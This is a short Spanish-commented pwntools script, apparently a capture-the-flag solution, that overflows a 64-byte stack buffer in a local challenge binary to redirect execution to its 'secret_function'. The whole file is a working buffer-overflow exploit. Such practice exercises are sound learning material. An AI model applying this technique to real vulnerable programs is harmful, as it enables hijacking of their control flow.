from pwn import *

# Configuración
context.log_level = 'debug'  # Para ver detalles de la comunicación
binary = ELF('./reto_pwn')

# Calculamos el offset (buffer 64 + RBP 8 = 72)
offset = 72
secret_addr = p64(binary.sym.secret_function)

# Construcción del payload
payload = flat(
    b'A' * offset,
    secret_addr
)

# Ejecución
p = process('./reto_pwn')

# Enviamos el payload directamente (sin esperar prompt)
p.sendline(payload)

# Mostramos toda la salida
print(p.clean().decode())
